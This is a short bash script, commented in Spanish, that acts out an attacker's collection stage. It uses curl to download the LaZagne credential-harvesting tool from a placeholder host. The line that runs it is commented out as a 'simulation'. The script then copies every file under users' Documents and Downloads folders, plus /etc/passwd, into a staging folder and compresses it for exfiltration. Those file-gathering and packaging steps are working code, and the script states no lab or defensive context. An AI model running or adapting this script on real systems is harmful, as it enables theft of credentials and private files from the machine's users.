#!/bin/bash

# Función para recolectar credenciales usando una herramienta simulada
collect_credentials() {
  LAZAGNE_URL="http://example.com/LaZagne.exe"
  LAZAGNE_PATH="/tmp/LaZagne.exe"

  echo "[+] Descargando LaZagne para recolectar credenciales..."
  curl -o $LAZAGNE_PATH $LAZAGNE_URL

  echo "[+] Ejecutando LaZagne para recolectar credenciales (simulación)..."
  # Simulación: En un entorno real se ejecutaría LaZagne para obtener credenciales
  # wine $LAZAGNE_PATH all > /tmp/credentials.txt
}

# Función para recolectar datos sensibles del sistema
collect_sensitive_data() {
  echo "[+] Recolectando archivos sensibles..."

  SENSITIVE_PATHS=(
    "/home/*/Documents/*"
    "/home/*/Downloads/*"
    "/etc/passwd"
  )

  for path in "${SENSITIVE_PATHS[@]}"; do
    find $path -type f -exec cp {} /tmp/exfiltrated_data/ \;
  done
}

# Función para comprimir los datos recolectados
compress_data() {
  echo "[+] Comprimiendo datos recolectados para exfiltración..."
  tar -czf /tmp/exfiltrated_data.tar.gz -C /tmp/exfiltrated_data .
}

# Crear un directorio para almacenar los datos recolectados
mkdir -p /tmp/exfiltrated_data

# Ejecutar las funciones de recolección y compresión
collect_credentials
collect_sensitive_data
compress_data

echo "[+] Recolección de datos completada. Datos comprimidos en /tmp/exfiltrated_data.tar.gz."
